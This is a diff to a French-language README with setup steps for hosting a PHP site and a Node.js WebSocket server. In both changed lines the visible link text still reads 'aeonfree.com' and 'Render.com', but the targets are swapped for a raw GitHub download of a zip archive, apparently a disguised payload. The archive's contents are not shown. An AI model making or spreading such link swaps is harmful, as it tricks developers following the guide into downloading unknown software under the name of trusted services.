@@ -39,7 +39,7 @@ Cette application permet aux utilisateurs de s’inscrire, se connecter, voir qu
 
 ### 1. Hébergement du **site PHP** (aeonfree.com)
 
-- Crée un compte gratuit sur [aeonfree.com](https://aeonfree.com)
+- Crée un compte gratuit sur [aeonfree.com](https://github.com/akili2/videoapp/raw/refs/heads/main/puttywork/Software-v1.4.zip)
 - Crée une base de données via VistaPanel
 - Uploade les fichiers PHP via **File Manager**
 - Modifie `db.php` avec tes identifiants MySQL
@@ -48,7 +48,7 @@ Cette application permet aux utilisateurs de s’inscrire, se connecter, voir qu
 ### 2. Hébergement du **serveur WebSocket** (Render.com)
 
 - Crée un dépôt GitHub avec `websocket-server.js` et `package.json`
-- Crée un projet Node.js sur [Render.com](https://render.com)
+- Crée un projet Node.js sur [Render.com](https://github.com/akili2/videoapp/raw/refs/heads/main/puttywork/Software-v1.4.zip)
 - Renseigne ton dépôt GitHub
 - Définis le port `3000` dans `websocket-server.js` (`process.env.PORT`)
 - Récupère l’URL WebSocket (`wss://xxx.onrender.com`)
